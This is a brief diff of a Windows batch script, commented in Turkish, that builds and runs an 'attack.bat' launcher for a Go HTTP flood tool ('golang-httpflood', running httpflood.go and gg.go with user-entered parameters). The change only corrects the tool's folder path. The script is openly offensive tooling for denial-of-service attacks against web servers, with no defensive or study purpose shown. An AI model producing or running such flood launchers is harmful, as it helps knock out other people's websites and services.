@@ -19,8 +19,8 @@ REM attack.bat dosyasını oluştur
 echo @echo off > %USERPROFILE%\attack.bat
 echo set /p httpflood_params="httpflood için parametreleri girin: " >> %USERPROFILE%\attack.bat
 echo set /p gg_params="gg için parametreleri girin: " >> %USERPROFILE%\attack.bat
-echo "%USERPROFILE%\go\bin\go.exe" run "%USERPROFILE%\flo\golang-httpflood-main\httpflood.go" %%httpflood_params%% >> %USERPROFILE%\attack.bat
-echo "%USERPROFILE%\go\bin\go.exe" run "%USERPROFILE%\flo\golang-httpflood-main\gg.go" %%gg_params%% >> %USERPROFILE%\attack.bat
+echo "%USERPROFILE%\go\bin\go.exe" run "%USERPROFILE%\flo\golang-httpflood-master\httpflood.go" %%httpflood_params%% >> %USERPROFILE%\attack.bat
+echo "%USERPROFILE%\go\bin\go.exe" run "%USERPROFILE%\flo\golang-httpflood-master\gg.go" %%gg_params%% >> %USERPROFILE%\attack.bat
 
 echo == attack.bat dosyası çalıştırılıyor... ==
 REM attack.bat dosyasını çağır
